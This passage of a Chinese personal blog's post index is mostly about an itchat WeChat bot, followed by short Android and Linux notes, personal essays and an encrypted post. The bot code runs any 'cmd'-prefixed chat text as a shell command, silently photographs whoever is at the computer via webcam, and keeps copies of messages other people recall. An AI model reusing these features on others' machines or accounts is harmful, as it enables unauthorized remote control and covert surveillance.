class="string">&quot;NickName&quot;</span>]</span><br><span class="line">    <span class="comment"># 消息内容</span></span><br><span class="line">    msg_content = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 分享的链接</span></span><br><span class="line">    msg_share_url = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            接收视频和图片和文件，自动保存以及回发</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># msg.download(msg.fileName)</span></span><br><span class="line">    <span class="comment"># typeSymbol = &#123;</span></span><br><span class="line">    <span class="comment">#     PICTURE: &#x27;img&#x27;,</span></span><br><span class="line">    <span class="comment">#     VIDEO: &#x27;vid&#x27;, &#125;.get(msg.type, &#x27;fil&#x27;)</span></span><br><span class="line">    <span class="comment"># return &#x27;@%s@%s&#x27; % (typeSymbol, msg.fileName)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Text&#x27;</span> \</span><br><span class="line">            <span class="keyword">or</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Friends&#x27;</span>:</span><br><span class="line">        msg_content = msg[<span class="string">&#x27;Text&#x27;</span>]</span><br><span class="line">    <span class="keyword">elif</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Recording&#x27;</span> \</span><br><span class="line">            <span class="keyword">or</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Attachment&#x27;</span> \</span><br><span class="line">            <span class="keyword">or</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Video&#x27;</span> \</span><br><span class="line">            <span class="keyword">or</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Picture&#x27;</span>:</span><br><span class="line">        msg_content = <span class="string">r&quot;&quot;</span> + msg[<span class="string">&#x27;FileName&#x27;</span>]</span><br><span class="line">        <span class="comment"># 保存文件</span></span><br><span class="line">        msg[<span class="string">&#x27;Text&#x27;</span>](rev_tmp_dir + msg[<span class="string">&#x27;FileName&#x27;</span>])</span><br><span class="line">    <span class="keyword">elif</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Card&#x27;</span>:</span><br><span class="line">        msg_content = msg[<span class="string">&#x27;RecommendInfo&#x27;</span>][<span class="string">&#x27;NickName&#x27;</span>] + <span class="string">r&quot; 的名片&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Map&#x27;</span>:</span><br><span class="line">        x, y, location = re.search(</span><br><span class="line">            <span class="string">&quot;&lt;location x=\&quot;(.*?)\&quot; y=\&quot;(.*?)\&quot;.*label=\&quot;(.*?)\&quot;.*&quot;</span>, msg[<span class="string">&#x27;OriContent&#x27;</span>]).group(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> location <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            msg_content = <span class="string">r&quot;纬度-&gt;&quot;</span> + x.__str__() + <span class="string">&quot; 经度-&gt;&quot;</span> + y.__str__()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_content = <span class="string">r&quot;&quot;</span> + location</span><br><span class="line">    <span class="keyword">elif</span> msg[<span class="string">&#x27;Type&#x27;</span>] == <span class="string">&#x27;Sharing&#x27;</span>:</span><br><span class="line">        msg_content = msg[<span class="string">&#x27;Text&#x27;</span>]</span><br><span class="line">        msg_share_url = msg[<span class="string">&#x27;Url&#x27;</span>]</span><br><span class="line">    face_bug = msg_content</span><br><span class="line">    <span class="comment"># 更新字典</span></span><br><span class="line">    msg_dict.update(</span><br><span class="line">        &#123;</span><br><span class="line">            msg_id: &#123;</span><br><span class="line">                <span class="string">&quot;msg_from&quot;</span>: msg_from, <span class="string">&quot;msg_time&quot;</span>: msg_time, <span class="string">&quot;msg_time_rec&quot;</span>: msg_time_rec,</span><br><span class="line">                <span class="string">&quot;msg_type&quot;</span>: msg[<span class="string">&quot;Type&quot;</span>],</span><br><span class="line">                <span class="string">&quot;msg_content&quot;</span>: msg_content, <span class="string">&quot;msg_share_url&quot;</span>: msg_share_url</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 收到note通知类消息，判断是不是撤回并进行相应操作</span></span><br><span class="line"><span class="meta">@itchat.msg_register(<span class="params">[NOTE]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg_helper</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">global</span> face_bug</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;&lt;!\[CDATA\[.*撤回了一条消息\]\]&gt;&quot;</span>, msg[<span class="string">&#x27;Content&#x27;</span>]) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 获取消息的id</span></span><br><span class="line">        old_msg_id = re.search(<span class="string">r&quot;&lt;msgid&gt;(.*?)&lt;/msgid&gt;&quot;</span>, msg[<span class="string">&#x27;Content&#x27;</span>]).group(<span class="number">1</span>)</span><br><span class="line">        old_msg = msg_dict.get(old_msg_id, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(old_msg_id) &lt; <span class="number">11</span>:</span><br><span class="line">            itchat.send_file(rev_tmp_dir + face_bug, toUserName=<span class="string">&#x27;filehelper&#x27;</span>)</span><br><span class="line">            os.remove(rev_tmp_dir + face_bug)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_body = <span class="string">&quot;告诉你一个秘密~&quot;</span> + <span class="string">&quot;\n&quot;</span> \</span><br><span class="line">                       + old_msg.get(<span class="string">&#x27;msg_from&#x27;</span>) + <span class="string">&quot; 撤回了 &quot;</span> + old_msg.get(<span class="string">&quot;msg_type&quot;</span>) + <span class="string">&quot; 消息&quot;</span> + <span class="string">&quot;\n&quot;</span> \</span><br><span class="line">                       + old_msg.get(<span class="string">&#x27;msg_time_rec&#x27;</span>) + <span class="string">&quot;\n&quot;</span> \</span><br><span class="line">                       + <span class="string">&quot;撤回了什么 ⇣&quot;</span> + <span class="string">&quot;\n&quot;</span> \</span><br><span class="line">                       + <span class="string">r&quot;&quot;</span> + old_msg.get(<span class="string">&#x27;msg_content&#x27;</span>)</span><br><span class="line">            <span class="comment"># 如果是分享存在链接</span></span><br><span class="line">            <span class="keyword">if</span> old_msg[<span class="string">&#x27;msg_type&#x27;</span>] == <span class="string">&quot;Sharing&quot;</span>: msg_body += <span class="string">&quot;\n就是这个链接➣ &quot;</span> + old_msg.get(<span class="string">&#x27;msg_share_url&#x27;</span>)</span><br><span class="line">            <span class="comment"># 将撤回消息发送到文件助手</span></span><br><span class="line">            itchat.send(msg_body, toUserName=<span class="string">&#x27;filehelper&#x27;</span>)</span><br><span class="line">            <span class="comment"># 有文件的话也要将文件发送回去</span></span><br><span class="line">            <span class="keyword">if</span> old_msg[<span class="string">&quot;msg_type&quot;</span>] == <span class="string">&quot;Picture&quot;</span> \</span><br><span class="line">                    <span class="keyword">or</span> old_msg[<span class="string">&quot;msg_type&quot;</span>] == <span class="string">&quot;Recording&quot;</span> \</span><br><span class="line">                    <span class="keyword">or</span> old_msg[<span class="string">&quot;msg_type&quot;</span>] == <span class="string">&quot;Video&quot;</span> \</span><br><span class="line">                    <span class="keyword">or</span> old_msg[<span class="string">&quot;msg_type&quot;</span>] == <span class="string">&quot;Attachment&quot;</span>:</span><br><span class="line">                file = <span class="string">&#x27;@fil@%s&#x27;</span> % (rev_tmp_dir + old_msg[<span class="string">&#x27;msg_content&#x27;</span>])</span><br><span class="line">                itchat.send(msg=file, toUserName=<span class="string">&#x27;filehelper&#x27;</span>)</span><br><span class="line">                os.remove(rev_tmp_dir + old_msg[<span class="string">&#x27;msg_content&#x27;</span>])</span><br><span class="line">            <span class="comment"># 删除字典旧消息</span></span><br><span class="line">            msg_dict.pop(old_msg_id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@itchat.msg_register(<span class="params">FRIENDS</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_friend</span>(<span class="params">msg</span>):</span><br><span class="line">    msg.user.verify()</span><br><span class="line">    msg.user.send(<span class="string">&#x27;机器人启动，自动同意好友添加。&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    itchat.auto_login(hotReload=<span class="literal">True</span>, enableCmdQR=<span class="literal">False</span>)</span><br><span class="line">    itchat.send(usageMsg, <span class="string">&quot;filehelper&quot;</span>)</span><br><span class="line">    itchat.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>@itchat.msg_register(&#39;Text&#39;, isGroupChat=False)</code>这个是框架的语法，可以查文档，这个语法糖是绑定一个函数监听<code>Text</code>即文本消息，<code>isGroupChat=False</code>判断是不是群聊。这里不能重复绑定函数，不然有一个会失效。<code>@itchat.msg_register([PICTURE, MAP, CARD, SHARING, RECORDING, ATTACHMENT, VIDEO])</code> <code>@itchat.msg_register(FRIENDS)</code> <code>@itchat.msg_register([NOTE])</code>这个也是，写法不同，参照官方源码示例，好像文档没给出，但是影响、意义不大。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message = msg[<span class="string">&#x27;Text&#x27;</span>]</span><br><span class="line">   fromName = msg[<span class="string">&#x27;FromUserName&#x27;</span>]</span><br><span class="line">   toName = msg[<span class="string">&#x27;ToUserName&#x27;</span>]</span><br><span class="line">   msg_from = (itchat.search_friends(userName=msg[<span class="string">&#x27;FromUserName&#x27;</span>]))[<span class="string">&quot;NickName&quot;</span>]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里是绑定的函数接收一个<code>msg</code>形参，是一个字典，可以取出你接收到的一条消息里面包含的所有内容，有消息文本，发送者的微信ID，接受者的微信ID，以及发送者的昵称，还有更多的信息，要开发的话要去查官方资料了解一下，这里昵称通过框架的另外一个查找api查询微信ID对应的用户昵称。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> toName == <span class="string">&quot;filehelper&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">&quot;cap&quot;</span>:</span><br><span class="line">        cap = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line">        ret, img = cap.read()</span><br><span class="line">        cv2.imwrite(<span class="string">&quot;weixinTemp.jpg&quot;</span>, img)</span><br><span class="line">        itchat.send(<span class="string">&#x27;@img@%s&#x27;</span> % <span class="string">u&#x27;weixinTemp.jpg&#x27;</span>, <span class="string">&#x27;filehelper&#x27;</span>)</span><br><span class="line">        cap.release()</span><br><span class="line">    <span class="keyword">if</span> message[<span class="number">0</span>:<span class="number">3</span>] == <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">        os.system(message.strip(message[<span class="number">0</span>:<span class="number">4</span>]))</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">&quot;ast&quot;</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        itchat.send(<span class="string">&quot;消息助手已开启&quot;</span>, <span class="string">&quot;filehelper&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">&quot;astc&quot;</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        itchat.send(<span class="string">&quot;消息助手已关闭&quot;</span>, <span class="string">&quot;filehelper&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> flag == <span class="number">1</span>:</span><br><span class="line">    itchat.send(sendMsg, fromName)</span><br><span class="line">    log(<span class="string">&#x27;&#123;0&#125;    &#123;1&#125;:\n\n&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(msg_time_rec, msg_from, message))</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我这里判断消息来自微信的文件传输助手，就进行逻辑操作，这里也调用了<code>OpenCV</code>进行拍照，可以远程传输到手机上，监控当前电脑前的用户相貌，还有<code>cmd</code>远程执行Power Shell命令，还有自动回复开关。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&emsp;&emsp;还有群聊艾特取消息自动回复，消息防撤回，一些已注释的是不同的API写法，和我平时不使用的功能，这里我只是进行笼统的讲解和给出参考代码，因为也没有时间进行大篇幅的讲解，和讲述一些基础知识。有问题的通过我的网盘链接加群吧，基础知识会有人帮我讲解，他们解决不了的我会讲，代码就贴下面了，安装完模块就能进行测试了。</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    itchat.auto_login(hotReload=<span class="literal">True</span>, enableCmdQR=<span class="literal">False</span>)</span><br><span class="line">    itchat.send(usageMsg, <span class="string">&quot;filehelper&quot;</span>)</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><p>Linux端使用要把<code>enableCmdQR=False</code>改成<code>True</code>，基本用linux也不要我多说了，试试就知道。</p><p>地址：<a href="http://od.daoji.ml/">源码</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免签约免手续费支付接口</title>
      <link href="/posts/56199.html"/>
      <url>/posts/56199.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.com/large/e3bf8736gy1g3d7pu2m8xj21900u0x6p.jpg"></p><span id="more"></span><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;这是一套微信 + 支付宝的免签约免手续费的接口集成核心代码，实现方式主要是web协议的分析，然后写爬虫进行轮询，要想准确的分辨出来支付的是谁，应当采用备注的方式，微信需要客户手动备注，支付宝有一个超链接可以不进行手动备注，直接生成二维码就行。<strong>这是提供给开发者使用的，无基础者不提供技术支持。</strong>早期我的网站想要对接一下支付接口，微信、支付宝官方手续费太高，已达到<code>0.6</code>个百分点，且要签约。第三方的例如码支付，黛支付，支付通等存在信息不安全，以及不稳定，难接入，收取手续费等问题。通过我前几年做过的Android App的机器人，可判断出第三方均使用抓取协议实现的，所以我用Python实现了一个。</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><blockquote><p>如果需要商业合作，请加群找我，我可以把这套代码集成成一个系统，提供开发接口的支付接口系统。</p></blockquote><p>Python源码：<a href="http://od.daoji.ml/">地址</a> </p><p>PHP源码：<a href="https://github.com/ChenSee/ChenPay">github</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 支付接口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Studio 3.4.0利用Modelu生成Jar依赖包</title>
      <link href="/posts/16151.html"/>
      <url>/posts/16151.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fzgf0b6s51j21900u01kx.jpg"></p><span id="more"></span><p>1、新建一个AS项目(不详细介绍)<br>2、点击File-&gt;New-&gt;New Module<br>3、选择Android Library点next<br>4、点击Finish</p><p>5、将要打成Jar包的类放入新建的library目录下</p><p>6、打开新建的library下的<code>build.gradle</code>文件最后加入如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">task makejar(type: Copy)&#123;</span><br><span class="line">    //删除原来的jar包</span><br><span class="line">    delete &#x27;libs/test.jar&#x27;</span><br><span class="line"></span><br><span class="line">  //从该目录下拷贝生成的jar包(各版本AndroidStudio目录可能不一样最好自己检查一遍目录)</span><br><span class="line">    from(&#x27;build/intermediates/intermediate-jars/release/&#x27;)</span><br><span class="line">     </span><br><span class="line">    //拷贝到该目录</span><br><span class="line">    into(&#x27;libs&#x27;)</span><br><span class="line">     </span><br><span class="line">    include(&#x27;classes.jar&#x27;)</span><br><span class="line">    //命名文件为test.jar</span><br><span class="line">    rename(&#x27;classes.jar&#x27;,&#x27;test.jar&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">makejar.dependsOn(build)</span><br></pre></td></tr></table></figure><p>7、在命令行输入<code>gradlew makejar</code>按回车<br>8、等待一段时间显示<code>build successful</code>就可以了<br>9、把目录显示切换成<code>project</code>模式在下图目录<code>libs</code>中就能找到了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>少量数据使用SharedPreferences存储</title>
      <link href="/posts/42127.html"/>
      <url>/posts/42127.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fzgecpyfuvj21900u01kz.jpg"></p><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>&emsp;&emsp;SharedPreferences是使用<strong>键值对</strong>来存储数据的，所以每当保存和取出一条数据，需要给这条数据提供一个对应的键。而且SharedPreferences是支持多种不同的数据类型存储，也就是当存入的数据类型是什么样，取出来就是什么样的。SharedPreferences进行数据持久化要比使用文件方便的多。</p><h3 id="将数据存进SharedPreferences"><a href="#将数据存进SharedPreferences" class="headerlink" title="将数据存进SharedPreferences"></a>将数据存进SharedPreferences</h3><p>&emsp;&emsp;要使用SharedPreferences存储数据，首先要获取SharedPreferences对象，Android提供的三种获取SharedPreferences对象的方法。</p><ol><li><p>Context类中的<code>getSharedPreferences()</code>方法</p><p>此方法接收两个参数。</p><blockquote><p>①用于指定SharedPreferences文件名称  //不存在则创建一个，存放<code>/data/data/&lt;packge name&gt;/shared_prefs/</code>目录下</p><p>②用于指定操作模式  //目前只有<code>MODE_PRIVATE</code>可选，传入0值相同，其他模式均被抛弃</p></blockquote></li><li><p>Activity类中的<code>getPreferences()</code>方法</p><p>该方法只接收操作模式<code>MODE_PRIVATE</code>，该方法被调用的时候自动以当前活动的类名作为SharedPerferences的文件名。</p></li><li><p>PreferenceManager类中的<code>getDefaultSharedPreferences()</code>方法</p><p>这是一个静态的方法，它接收一个Context参数，并自动使用当前程序的包名为前缀命名SharedPerferences文件。</p></li></ol><p>获取SharedPerferences对象后，就能向SharedPreferences中添加数据了，分3步实现</p><blockquote><p>⑴调用SharedPerferences对象的edit()方法来获取一个SharedPerferences.Editor对象。</p><p>⑵向SharedPerferences.Editor对象中添加数据，比如添加一个布尔型数据就使用putBoolean()方法，添加一个字符串就使用putString()方法，以此类推。</p><p>⑶调用apply()方法将添加的数据提交，从而完成数据存储操作。</p></blockquote><h3 id="从SharedPreferences中取出数据"><a href="#从SharedPreferences中取出数据" class="headerlink" title="从SharedPreferences中取出数据"></a>从SharedPreferences中取出数据</h3><p>&emsp;&emsp;SharedPerferences对象提供了<code>getString（）</code>等方法对数据进行读取，get方法均要传入两个参数，第一个为键，第二个为默认值，例如<code>getSharedPreferences(&quot;data&quot;,MODE_PRIVATE).getString(&quot;name&quot;,&quot;&quot;)</code>、<code>getSharedPreferences(&quot;data&quot;,MODE_PRIVATE).getBoolean(&quot;eated&quot;,false)</code>。读取的SharedPreferences对象创建方法，应该和存储的SharedPreferences对象一样，否则会找不到SharedPreferences文件。</p><p>注：<code>Ctrl + P</code>可以查看一个方法的参数类型，规范的代码会带有注释说明。自动补全在类名后加点可以查看该类可以被外部引用的方法。<code>Ctrl+点击</code>进去代码查看也可以。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没有收获到预期的成果只能怪我还不够努力</title>
      <link href="/posts/43265.html"/>
      <url>/posts/43265.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.com/large/e3bf8736gy1fzgepm425dj218i0tonpe.jpg" alt="1546600666622"></p><span id="more"></span><h3 id="考试失利"><a href="#考试失利" class="headerlink" title="考试失利"></a>考试失利</h3><p>&emsp;&emsp;以为我学的很好了，但是笔试的时候却不理想，那么简单的一道题，到头来还是做错了，一转身就发现错误的那种简单的题。反思过后，觉得我不是学的不好，是用的太少，缺乏实践经验。</p><h3 id="追求极致"><a href="#追求极致" class="headerlink" title="追求极致"></a>追求极致</h3><p>&emsp;&emsp;我说的追求极致，也不是非要到一个很高的顶点，但是至少也要有一定成就，有一定的量。没有积累的知识，到头来只是一个空壳。昨天群里的小伙伴推荐给我TS，今天又在学Flutter了，之前推给我Vue.js后来又推给我<a href="https://angular.io/"><em>Angular</em> </a>。一个人的精力是有限的，我也意识到了，但是我还是没掌握好。</p><p>&emsp;&emsp;无论学习什么，要去掌握好一门知识，真的不是表面就行的。实践、操作后才能真正掌握好。</p><blockquote><p>告诫：学习要追求深层次的理解，不要停留在只是会用的地步，才能真正的接近大神，没有第二条道路可走。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写给我的兄弟</title>
      <link href="/posts/26337.html"/>
      <url>/posts/26337.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/e3bf8736gy1fzgewjp0j0j20zk0ntnpd.jpg"></p><span id="more"></span><blockquote><p>也算是昨天的事吧，现在还是半夜，人生、感情真是复杂。</p></blockquote><h3 id="接着昨晚熬夜写代码"><a href="#接着昨晚熬夜写代码" class="headerlink" title="接着昨晚熬夜写代码"></a>接着昨晚熬夜写代码</h3><p>&emsp;&emsp;一直在赶需求，坐在电脑前码着代码，<code>C Sharp</code>也是挺有趣的，面向对象，学过<code>Java</code>自然很容易掌握了。</p><p>&emsp;&emsp;工作也不是说辛苦，就是钱少，不值，反正也是为了学习，都可以。结果22点-23点的时候吧，忽然WIFI一下子没有网络了，一打开浏览器，结果联通提示已欠费。屋漏天逢连夜雨啊。</p><h3 id="兄弟最后成了表面兄弟"><a href="#兄弟最后成了表面兄弟" class="headerlink" title="兄弟最后成了表面兄弟"></a>兄弟最后成了表面兄弟</h3><p>&emsp;&emsp;之前的宽带都是借一个同乡的身份证开的，因为我之前玩免流，开过太多卡，而且还没销户，很麻烦，所以只能借别人的身份证开网。我就跟这位兄弟说借身份证号码给我续费（因为他自己不需要开宽带），结果这位兄弟晾了我半天。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">他说：“你拿你的吧。“</span><br><span class="line">我说：“我的绑定太多卡了，开不了。”</span><br><span class="line">...</span><br><span class="line">我说：“你要是不借我的话，只能去找别人借了。”</span><br><span class="line">他才回复：“都可以。”</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;不知道什么时候开始我们原来连表面兄弟都不是了，难道是因为我这段时间进了工作室，项目又多，经常赶项目，没去找他，也没怎么和他说话，偶尔才网聊导致的吗？认识也超过一年了，快一年半了，结果我以为能成为一个交心的兄弟变成了连表面兄弟都不愿意的联系人。</p><p>&emsp;&emsp;虽然手机上、微信、QQ都有联系方式，但是我觉得我应该不会主动去联系他了。实际上后面的聊天记录就是我一个人在发送，如果他希望不想做表面兄弟，也不摊牌，那就这样子吧。<strong>情谊不在，恩情在。</strong>这样或者不失为一个合理的做法。一年多的相处真是谢谢了，你帮助了我很多，真心感谢你！</p><h3 id="不是所有的兄弟都是表面兄弟"><a href="#不是所有的兄弟都是表面兄弟" class="headerlink" title="不是所有的兄弟都是表面兄弟"></a>不是所有的兄弟都是表面兄弟</h3><p>&emsp;&emsp;后面我又去找了其他人借身份证开网，但是附近的人大家都需要，找了几个人没能借到。最后还是找上了我的小可爱（淡定），二话不说就答应我了，虽然以前算是同学，但是没有什么交流，没什么印象。</p><p>&emsp;&emsp;我很庆幸，不是所有的兄弟都是表面兄弟。还有其他的兄弟我没去找，有很多兄弟我们很久没有联系，没有见面，甚至上一次网聊都可能超过一年了，也不是说我不把你们当兄弟了。我们都还年轻，都还在拼搏。身在不同的地方， 有着各自的忙碌，<strong>如果你还把我当兄弟，当你看到这里的时候，希望你理解我无论多久没联系，当我认出你的时候，我们依旧是兄弟</strong>。</p><p>&emsp;&emsp;身在我身边的人，不一定理解我。真正了解我的人，知道我每天花费大量的时间和精力去学习，提升自己。或许我还在网上和你嘻言，但是同时我的浏览打开十几个页面在查询资料，又或者播放器播放着学习资料。</p><p>&emsp;&emsp;希望我的兄弟们理解我，或许我们没有机会联系，但是我会在远方祝福你！当你长久不见，发给我的第一条消息是求助时。我大概会很开心的应承下来吧。因为你困难的时候想到了我，作为兄弟我也很愿意去帮助你。</p><center><b>愿我身边的、远方的兄弟身体健康，万事如意。虽然不能给你发送祝福，但是我内心的祝福不会少一分。</b></center>]]></content>
      
      
      
        <tags>
            
            <tag> 情感思绪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo开始写的第一篇文章</title>
      <link href="/posts/649.html"/>
      <url>/posts/649.html</url>
      
        <content type="html"><![CDATA[<h3 id="Hexo部署了两个多小时，还不是很会写出格式很规整的文章，但是这个学习是值得的。"><a href="#Hexo部署了两个多小时，还不是很会写出格式很规整的文章，但是这个学习是值得的。" class="headerlink" title="Hexo部署了两个多小时，还不是很会写出格式很规整的文章，但是这个学习是值得的。"></a>Hexo部署了两个多小时，还不是很会写出格式很规整的文章，但是这个学习是值得的。</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 7安装SSH</title>
      <link href="/posts/43992.html"/>
      <url>/posts/43992.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux通过ps-ef过滤进程获得行数"><a href="#Linux通过ps-ef过滤进程获得行数" class="headerlink" title="Linux通过ps -ef过滤进程获得行数"></a>Linux通过ps -ef过滤进程获得行数</h1><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count=`ps -fe |grep &quot;one.php&quot; | grep -v &quot;grep&quot; | wc -l`</span><br></pre></td></tr></table></figure><p>获取行数并赋值给count。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二合一：番号站+资源站</title>
      <link href="/posts/36059.html"/>
      <url>/posts/36059.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="28ddf8bd407e9e63b36c11f12ff146e9b405f2db0be305416755304cd765c8f2">bee253aadfa4ff37c6d6d73274f657f169f82a775e01842208d35433b89665da879d42ad172fdf0ab23e1a82c5bebf1b1f95d66ab9cea798d5a275e89cd3dcb29c43377ba3def06c8f8c126b479cd6feb4f6b4c9a27adc8cf7665b61a8a35db581f16a9432df39d7d7b0c090c361f07e76af72138602a477c9ba750c9a78df06d8f7f137b43af031f04505dd9acaaf2fb35c3725865d0bcf21f2d716039fafb4603479b7795913775043c1147b1a475d4becddbed48bf2581a64f0c8dc7a3e79cfa139bdac5c045db40c2fe5f8327c47a6f0a053e38512299c7acd859f74c6f63eb49c4035fb7b95816d0263af8337409e33f9575671e66614d01a54a803259da047012a90d1ee6fb9d272dff58d753fadc085af85f90b1eadb29b506ce48cf25d56a1064f1b43f3a20333ba0ac65b6595f2875d08da3c4ca403ebba787cb6b66bacb9468f463d20578faa3a26a88893cfef194e95cc71e5bd062bbea268614b26fa48e66abd639a68bbe49b5a87369f084c796bf2d9ef16b59aa2ae1f2f9b8e8db435354162795d2a92e1c153ddd59e9c1aeb8f85a9e51d64d4002439de85dcbf7e47fcf98aed2a91d9a28f26920117ba89581fd8e182bccdf40dd8d07436a5f8079a7f6d8f132b20b224059587cdf2413da037593237e6e075625c603bdffd7d2feafade6928e0507d5c45262ac0c22252b55211b6e0a3404549633c8c99f4bb830962500b41326af262351e4d7a79c68fbc86cf00b2e5f8a9c4fe634a941a754d76b967188da395a455179a300aa04fc32e1f743efb441b17f1ee56aec4c2c5c4ce955f2413225491f0cdce8ecada3129fe576746c56f78ee9e99c7c59f690fb2ddf684f16e67d03673c00c33d71c9a6e11bffeeaa75967cc1df12595d3d7fc0e69612b49fd0bb2fd4888eb097ba88ee4c759d3e93f4d70e81cb978c6c88353f349b7c2cda22a3816721bf008c6dce95fdc5fba0ab1087914bbe766b63d4369491a48cef3bcac542647aac3ac6e790cdd3858481d5d6c0e0be81ed216028faa411f376aeb1